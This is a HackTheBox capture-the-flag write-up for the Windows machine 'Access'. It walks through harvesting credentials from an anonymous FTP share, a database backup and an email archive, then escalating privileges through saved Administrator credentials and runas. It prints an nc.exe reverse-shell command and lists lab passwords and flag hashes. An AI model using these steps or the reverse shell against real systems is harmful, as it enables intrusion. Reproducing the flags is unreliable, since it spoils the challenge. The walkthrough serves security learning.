```json
Alias: Access
Date: 16-08_2024
Platform: Hackthebox
OS: Windows
Difficulty: Easy
Status: Complete
IP: 10.129.38.58
```

# Access
# Summary

-  Access is an easy difficulty machine, that highlights how machines associated with the physical security of an environment may not themselves be secure. Also highlighted is how accessible FTP/file shares can often lead to getting a foothold or lateral movement. It teaches techniques for identifying and exploiting saved credentials.


---

# Information Gathering
## NMAP
```
Starting Nmap 7.95 ( https://nmap.org ) at 2024-08-16 11:57 PKT
Stats: 0:02:37 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 12:01 (0:01:09 remaining)
Nmap scan report for 10.129.38.58
Host is up (0.25s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: MegaCorp
|_http-server-header: Microsoft-IIS/7.5
| http-methods:
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
---
# Enumeration
There is a FTP server running on the target that contains a backup.mdb file, We can inspect the file with mdb-tools and confirm that a table named auth_user exists.

Convert to json with

`mdb-json backup.mdb auth_user`

and we get this

```
{"id":25,"username":"admin","password":"admin","Status":1,"last_login":"08/23/18 21:11:47","RoleID":26}
{"id":27,"username":"engineer","password":"access4u@security","Status":1,"last_login":"08/23/18 21:13:36","RoleID":26}
{"id":28,"username":"backup_admin","password":"admin","Status":1,"last_login":"08/23/18 21:14:02","RoleID":26}
```

We can now unzip the file present in the Engineers folder in the ftp share with password `access4u@security`

The file inside is an Outlook PST file. We can use evolution to look inside it and we will find this email from `john@megacorp.com` To `security@accesscontrolsystems.com`

```
Hi there,

The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.

Regards,

John
```

| Username | Password         |
| -------- | ---------------- |
| security | 4Cc3ssC0ntr0ller |

---

# Exploitation

We can then log in to the machine using telnet.

---
# Privilege Escalation

For privilege escalation, we can check the stored credentials on the machine using

`cmdkey /list`

Notice that the creds for Administrator are saved, There is also a link to runas in C:\\Users\\Public\\Desktop. we can use runas to get a reverse shell as admin.

```
runas /user:Administrator /savecred "C:\Users\Security\nc.exe 10.10.14.188 4444 -e cmd"
```

---

# Flags
- d98e63edcd0232f2123b149e2d2b14d2
- 6d2e35bd56e88b155ea4887de3cc4c48

#CTF #CTF/Hackthebox/Easy #CTF/Hackthebox/Easy #Windows #Windows/CredentialHunting 